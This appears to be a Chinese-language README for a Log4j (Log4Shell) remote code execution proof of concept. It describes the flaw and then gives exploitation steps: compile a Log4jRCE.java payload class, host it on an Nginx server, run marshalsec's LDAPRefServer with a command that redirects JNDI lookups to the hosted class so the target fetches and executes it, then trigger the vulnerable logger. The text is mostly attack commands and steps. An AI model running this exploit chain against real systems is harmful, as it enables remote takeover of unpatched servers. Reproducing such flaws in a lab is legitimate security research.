# Apache-Log4j
Apache Log4j 远程代码执行

> 攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响

![image](https://user-images.githubusercontent.com/45926593/145425339-47c71230-87d2-4519-8919-9c3520850f83.png)


# 复现步骤
1、编译src/main/java/Log4jRCE.java
```shell
javac Log4jRCE.java
```
编译后的class文件传到Nginx服务器，当然也可以选择其他的方式  
2、修改logger地址为Nginx上的class地址 "/Log4jRCE"  
3、执行marshalsec
```shell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:7880/#Log4jRCE"
```
4、运行src/main/java/Log4j.java